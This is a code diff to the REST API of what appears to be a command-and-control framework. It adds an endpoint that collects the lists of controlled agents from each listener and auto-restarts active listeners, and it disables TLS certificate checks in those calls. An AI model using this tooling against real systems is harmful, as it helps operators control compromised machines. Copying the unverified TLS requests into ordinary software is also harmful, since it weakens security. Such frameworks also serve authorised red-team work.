@@ -14,6 +14,7 @@ import datetime
 from multiprocessing import Process
 import json
 import hashlib
+import urllib3
 
 class C2_Rest_API:
 
@@ -29,6 +30,7 @@ class C2_Rest_API:
         self.encryption_key = get_random_bytes(32)
         self.register_code = register_code or base64.b64encode(base64.a85encode(b"token-"+"".join([random.choice("azertyuiopmlkjhgfdsqwxcvbn1234567890AZERTYUIOPMLKJHGFDSQWXCVBN!?-_/\\$") for _ in range(random.randint(30,50))]).encode())).decode()
         self.db_path = db_path or "./libs/api/db/lightc2.db"
+        urllib3.disable_warnings()
         ##### Methode stockage passwd : bcrypt
         ##### methode generation token : user : encrypted(heure+nonce+bcrypt+cheksum du token)  -> stockage en runtime dans un dico {"pseudo":{heure:token}} --> possibilité expiration token (par defaut qques heures) et 1 seul token valide a la fois (revoquer sessions via cli)
         ##### Voir pour de l'auth LDAP
@@ -211,8 +213,9 @@ class C2_Rest_API:
                         return "[Error] Listener already stopped !"
                     log_info(f"'{username}' Stopping listener {identifier}","running")
                     self.all_listeners[identifier].stop_listener()
-                    self.all_processes[identifier].terminate()
-                    self.all_processes[identifier].join()
+                    if identifier in self.all_processes.keys():
+                        self.all_processes[identifier].terminate()
+                        self.all_processes[identifier].join()
                     db_exec(stop_listener_update_db(bind_port),self.db_path)
                     log_info(f"Stopped listener {identifier} for {username}","success")
                     return "[Success] Listener Successfully stopped"
@@ -239,8 +242,9 @@ class C2_Rest_API:
                 if int(db_exec(is_listener_started(bind_port),self.db_path)[0][0])==1:
                     log_info(f"'{username}' Stopping listener {identifier}","running")
                     self.all_listeners[identifier].stop_listener()
-                    self.all_processes[identifier].terminate()
-                    self.all_processes[identifier].join()
+                    if identifier in self.all_processes.keys():
+                        self.all_processes[identifier].terminate()
+                        self.all_processes[identifier].join()
                     db_exec(stop_listener_update_db(bind_port),self.db_path)
                     log_info(f"Stopped listener {identifier} for {username}","success")
                 log_info(f"'{username}' Removing listener {identifier}","running")
@@ -446,6 +450,27 @@ class C2_Rest_API:
             db_exec(change_vault_blob(vault_id,ct),self.db_path)
             log_info(f"'{username}' Successfully removed cred from vault","success")
             return "[Success] Creds removed from the vault blob"
+
+        @api.route("/agents",methods=["GET"])
+        def get_agents():
+            if not "X-Auth" in request.headers.keys() or not self.verify_token(request.headers["X-Auth"]):
+                log_info("Someone tried to access a webpage without being authenticated/giving a good password","error")
+                return "[Error] Please provide an API Key via X-Auth or correct the one you gave"
+            else:
+                username = db_exec(get_user_from_token(request.headers["X-Auth"]),self.db_path)[0][0]
+            log_info(f"'{username}' asked for the agent list","running")
+            all_agents = {}
+            for listener in self.all_listeners.values():
+                admin_key = listener.admin_key
+                port = listener.port
+                host = listener.host
+                ssl = listener.ssl
+                url = f'http{["s" if ssl else ""][0]}://{host}:{port}/get_agents'
+                headers = {"X-Auth":admin_key,"Accept":"application/json","Content-Type":"application/json"}
+                all_listener_agents = requests.get(url,headers=headers,verify=False).json()
+                all_agents[f"{listener.host}:{listener.port}"]=all_listener_agents
+            log_info(f"Agent list provided to '{username}'","success")
+            return json.dumps({"result":all_agents})
             
 
 
@@ -481,6 +506,14 @@ class C2_Rest_API:
             listener_object = HTTP_Handler(listener["port"],listener["host"],bool(int(listener["ssl"])),False,listener["admin_key"],listener["secret_key"])
             self.all_listeners[f"{listener['host']}:{listener['port']}"]=listener_object
             log_info(f"Listener {listener['host']}:{listener['port']} created","success")
+            if int(listener["active"])==1:
+                bind_port = listener_object.port
+                log_info(f"Starting listener {listener['host']}:{listener['port']}","running")
+                self.all_processes[f"{listener['host']}:{listener['port']}"]=Process(target=self.all_listeners[f"{listener['host']}:{listener['port']}"].start_listener)
+                self.all_processes[f"{listener['host']}:{listener['port']}"].start()
+                db_exec(start_listener_update_db(bind_port),self.db_path)
+                log_info(f"Started listener {listener['host']}:{listener['port']}","success")
+
         log_info(f"Re-Generated listeners from db","success")
         return None
 
